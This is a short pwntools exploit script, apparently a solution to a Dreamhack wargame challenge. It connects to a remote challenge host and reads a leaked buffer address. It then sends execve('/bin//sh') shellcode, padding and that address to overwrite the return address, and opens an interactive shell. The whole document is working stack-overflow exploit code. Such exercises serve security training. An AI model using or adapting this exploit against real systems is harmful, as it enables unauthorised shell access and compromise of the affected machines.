from pwn import *

r = remote('host3.dreamhack.games',11934)
r.recvuntil('buf = (')
buf_address = int(r.recv(10),16)

context.arch = "amd64"

code = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
code += b'\x80'*126
code += p32(buf_address)

r.send(code)
r.interactive()
